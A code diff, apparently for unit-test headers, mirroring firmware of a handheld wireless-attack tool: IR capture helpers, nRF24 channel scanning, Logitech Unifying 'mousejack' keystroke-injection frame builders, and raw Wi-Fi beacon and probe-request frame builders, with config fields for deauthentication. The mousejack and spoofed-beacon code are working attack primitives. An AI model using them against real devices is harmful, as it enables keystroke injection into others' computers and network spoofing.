@@ -688,3 +688,262 @@ inline bool isValidDisassocFrame(const uint8_t* frame, size_t len) {
     if (frame[0] != 0xA0 || frame[1] != 0x00) return false;
     return true;
 }
+
+// ---- Config blob IR-pin migration (mirror of src/core/config.cpp v2 change) ----
+// Same-commit sync rule: edits to the config migration must land in both places.
+static constexpr uint16_t PORKCHOP_CONFIG_VERSION = 2;
+static constexpr uint8_t PORKCHOP_IR_RX_DEFAULT = 4;   // VS1838B data pin
+static constexpr uint8_t PORKCHOP_IR_TX_DEFAULT = 44;  // IR LED pin
+
+inline bool porkchop_irPinValid(uint8_t pin) {
+    switch (pin) {
+        case 0:   // G0 button / zeroed v1 tail
+        case 3:   // NRF CE
+        case 5:   // NRF CSN / LoRa CS
+        case 12:  // SD CS
+        case 14:  // SPI MOSI
+        case 39:  // SPI MISO
+        case 40:  // SPI SCK
+            return false;
+        default:
+            return pin <= 48;
+    }
+}
+
+inline void porkchop_irSanitizePins(uint8_t& rx, uint8_t& tx) {
+    if (!porkchop_irPinValid(rx) || !porkchop_irPinValid(tx)) {
+        rx = PORKCHOP_IR_RX_DEFAULT;
+        tx = PORKCHOP_IR_TX_DEFAULT;
+    }
+}
+
+inline bool porkchop_blobNeedsIRMigration(uint16_t version, uint8_t rx, uint8_t tx) {
+    return version != PORKCHOP_CONFIG_VERSION ||
+           !porkchop_irPinValid(rx) || !porkchop_irPinValid(tx);
+}
+
+// Field-for-field mirrors of the packed ConfigBlob in src/core/config.cpp,
+// v1 (pre-IR) and v2 (IR tail). Used to prove the extension is tail-only.
+struct __attribute__((packed)) PorkchopBlobV1Mirror {
+    uint32_t magic;
+    uint16_t version;
+    uint16_t blobSize;
+    uint8_t  gpsEnabled;
+    uint8_t  gpsSource;
+    uint8_t  gpsRxPin;
+    uint8_t  gpsTxPin;
+    uint32_t gpsBaudRate;
+    uint16_t gpsUpdateInterval;
+    uint16_t gpsSleepTimeMs;
+    uint8_t  gpsPowerSave;
+    int8_t   gpsTimezoneOffset;
+    uint16_t channelHopInterval;
+    uint16_t spectrumHopInterval;
+    uint16_t lockTime;
+    uint8_t  enableDeauth;
+    uint8_t  randomizeMAC;
+    int8_t   spectrumMinRssi;
+    int8_t   attackMinRssi;
+    uint8_t  spectrumTopN;
+    uint16_t spectrumStaleMs;
+    uint8_t  spectrumCollapseSsid;
+    uint8_t  spectrumTiltEnabled;
+    char     otaSSID[33];
+    char     otaPassword[65];
+    uint8_t  autoConnect;
+    char     wpaSecKey[33];
+    char     wigleApiName[65];
+    char     wigleApiToken[65];
+    uint16_t burstInterval;
+    uint16_t advDuration;
+    uint8_t  mlEnabled;
+    uint8_t  mlCollectionMode;
+    char     mlModelPath[64];
+    float    mlConfidenceThreshold;
+    float    mlRogueApThreshold;
+    float    mlVulnScorerThreshold;
+    uint8_t  mlAutoUpdate;
+    char     mlUpdateUrl[128];
+};
+
+struct __attribute__((packed)) PorkchopBlobV2Mirror {
+    PorkchopBlobV1Mirror v1;
+    uint8_t irRxPin;
+    uint8_t irTxPin;
+};
+
+// ---- IR TOOLS pure helpers (mirror of src/modes/ir_tools.cpp) ----
+// Same-commit sync rule applies.
+#include <cstdio>
+#include <cstddef>
+
+// Parse 1..8 uppercase-or-lowercase hex chars into a 32-bit NEC value.
+inline bool porkchop_irParseHex32(const char* s, uint32_t& out) {
+    if (!s) return false;
+    uint32_t v = 0;
+    size_t n = 0;
+    for (; s[n] != '\0'; n++) {
+        if (n >= 8) return false;
+        char c = s[n];
+        v <<= 4;
+        if (c >= '0' && c <= '9') v |= (uint32_t)(c - '0');
+        else if (c >= 'a' && c <= 'f') v |= (uint32_t)(c - 'a' + 10);
+        else if (c >= 'A' && c <= 'F') v |= (uint32_t)(c - 'A' + 10);
+        else return false;
+    }
+    if (n == 0) return false;
+    out = v;
+    return true;
+}
+
+// Build the JSON body for a decoded capture. stateful protocols (AC class)
+// dump state bytes; value/address/command are union garbage there.
+inline size_t porkchop_irCaptureJson(char* out, size_t outLen,
+                                     const char* protocolName, bool stateful,
+                                     uint64_t value, uint32_t address, uint32_t command,
+                                     uint16_t bits, uint16_t rawlen, bool repeat,
+                                     bool overflow, const uint8_t* state, uint16_t stateLen) {
+    size_t n = 0;
+    #define IRJ_APPEND(...) do { \
+        if (n >= outLen) break; \
+        int w = snprintf(out + n, outLen - n, __VA_ARGS__); \
+        if (w < 0) break; \
+        n += (size_t)w; \
+        if (n >= outLen) { n = outLen - 1; break; } \
+    } while (0)
+
+    IRJ_APPEND("{\"protocol\":\"%s\",\"bits\":%u,\"repeat\":%s,\"overflow\":%s",
+               protocolName, (unsigned)bits, repeat ? "true" : "false",
+               overflow ? "true" : "false");
+    if (stateful) {
+        IRJ_APPEND(",\"state\":[");
+        for (uint16_t i = 0; i < stateLen; i++) {
+            IRJ_APPEND(i ? ",\"%02X\"" : "\"%02X\"", state[i]);
+        }
+        IRJ_APPEND("]");
+    } else {
+        IRJ_APPEND(",\"value\":\"0x%016llX\",\"address\":\"0x%08X\",\"command\":\"0x%08X\"",
+                   (unsigned long long)value, (unsigned)address, (unsigned)command);
+    }
+    IRJ_APPEND(",\"rawlen\":%u}", (unsigned)rawlen);
+
+    #undef IRJ_APPEND
+    return n;
+}
+
+// Monotonic capture filename: <dir>/ir_NNN.json (NNN zero-padded to 3).
+inline void porkchop_irCaptureFilename(char* out, size_t outLen,
+                                       const char* dir, uint16_t index) {
+    snprintf(out, outLen, "%s/ir_%03u.json", dir, (unsigned)index);
+}
+
+// ---- NRF TOOLS pure helpers (mirror of src/modes/nrf_tools.cpp) ----
+// Same-commit sync rule applies.
+#include <cstdint>
+
+static constexpr uint8_t PORKCHOP_NRF_CHANNEL_MAX = 83;
+static constexpr uint8_t PORKCHOP_NRF_CHANNEL_COUNT = PORKCHOP_NRF_CHANNEL_MAX + 1;
+
+// Candidate address (MSB-first, 5 bytes) from a 3-byte seed prefix:
+// prefix + cycling low byte + fixed 0x00 tail.
+inline void porkchop_nrfCandidateFromPrefix(const uint8_t prefix[3], uint16_t idx,
+                                            uint8_t out[5]) {
+    // LSB-first array: written-order prefix reversed at the tail.
+    out[0] = 0x00;
+    out[1] = (uint8_t)(idx & 0xFF);
+    out[2] = prefix[2];
+    out[3] = prefix[1];
+    out[4] = prefix[0];
+}
+
+// Scanner channel step: wraps at the legal ceiling (ch 83), never above.
+inline uint8_t porkchop_nrfScannerNextChannel(uint8_t ch) {
+    return (uint8_t)((ch + 1) % PORKCHOP_NRF_CHANNEL_COUNT);
+}
+
+// ---- NRF mousejack frame builders (mirror of src/modes/nrf_tools.cpp) ----
+// Logitech Unifying-class plain-ShockBurst frames, no CRC on air.
+static constexpr uint8_t PORKCHOP_NRF_PAYLOAD_MAX = 32;
+
+inline size_t porkchop_nrfBuildKeepalive(uint8_t out[PORKCHOP_NRF_PAYLOAD_MAX]) {
+    out[0] = 0x00;
+    out[1] = 0x40;
+    out[2] = 0x04;
+    return 3;
+}
+
+inline size_t porkchop_nrfBuildKeystroke(uint8_t out[PORKCHOP_NRF_PAYLOAD_MAX],
+                                         uint8_t mod, const uint8_t keys[6]) {
+    out[0] = 0x00;  // device number
+    out[1] = 0xC1;  // inject set-report
+    out[2] = 0x00;  // wIndex
+    out[3] = mod;   // HID modifier byte
+    out[4] = 0x00;  // reserved
+    for (uint8_t i = 0; i < 6; i++) out[5 + i] = keys[i];
+    return 11;
+}
+
+// USB HID keycode for the printable subset mousejack proof text needs.
+inline bool porkchop_nrfHidKeyCode(char c, uint8_t& out) {
+    if (c >= 'a' && c <= 'z') { out = (uint8_t)(0x04 + (c - 'a')); return true; }
+    if (c >= '1' && c <= '9') { out = (uint8_t)(0x1E + (c - '1')); return true; }
+    if (c == '0') { out = 0x27; return true; }
+    if (c == ' ') { out = 0x2C; return true; }
+    if (c == '\n') { out = 0x28; return true; }
+    return false;
+}
+
+// ---- WiFi attack frame builders (mirror of src/core/wsl_bypasser.cpp) ----
+// Same-commit sync rule applies.
+#include <cstring>
+
+static const uint8_t PORKCHOP_RATES_IE[10] = {
+    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
+};
+
+inline size_t porkchop_buildBeaconFrame(uint8_t* out, size_t cap,
+                                        const char* ssid, uint8_t ssidLen,
+                                        const uint8_t bssid[6], uint8_t channel,
+                                        uint16_t seq) {
+    const size_t need = 24 + 12 + 2 + ssidLen + 3 + sizeof(PORKCHOP_RATES_IE);
+    if (!out || cap < need || ssidLen > 32) return 0;
+
+    size_t n = 0;
+    out[n++] = 0x80; out[n++] = 0x00;
+    out[n++] = 0x00; out[n++] = 0x00;
+    memset(out + n, 0xFF, 6); n += 6;
+    memcpy(out + n, bssid, 6); n += 6;
+    memcpy(out + n, bssid, 6); n += 6;
+    out[n++] = (uint8_t)((seq & 0x0F));
+    out[n++] = (uint8_t)((seq >> 4) & 0xFF);
+    memset(out + n, 0x00, 8); n += 8;
+    out[n++] = 0x64; out[n++] = 0x00;
+    out[n++] = 0x21; out[n++] = 0x00;
+    out[n++] = 0x00; out[n++] = ssidLen;
+    memcpy(out + n, ssid, ssidLen); n += ssidLen;
+    out[n++] = 0x03; out[n++] = 0x01; out[n++] = channel;
+    memcpy(out + n, PORKCHOP_RATES_IE, sizeof(PORKCHOP_RATES_IE));
+    n += sizeof(PORKCHOP_RATES_IE);
+    return n;
+}
+
+inline size_t porkchop_buildProbeReqFrame(uint8_t* out, size_t cap,
+                                          const char* ssid, uint8_t ssidLen,
+                                          const uint8_t src[6], uint16_t seq) {
+    const size_t need = 24 + 2 + ssidLen + sizeof(PORKCHOP_RATES_IE);
+    if (!out || cap < need || ssidLen > 32) return 0;
+
+    size_t n = 0;
+    out[n++] = 0x40; out[n++] = 0x00;
+    out[n++] = 0x00; out[n++] = 0x00;
+    memset(out + n, 0xFF, 6); n += 6;
+    memcpy(out + n, src, 6); n += 6;
+    memset(out + n, 0xFF, 6); n += 6;
+    out[n++] = (uint8_t)((seq & 0x0F));
+    out[n++] = (uint8_t)((seq >> 4) & 0xFF);
+    out[n++] = 0x00; out[n++] = ssidLen;
+    memcpy(out + n, ssid, ssidLen); n += ssidLen;
+    memcpy(out + n, PORKCHOP_RATES_IE, sizeof(PORKCHOP_RATES_IE));
+    n += sizeof(PORKCHOP_RATES_IE);
+    return n;
+}
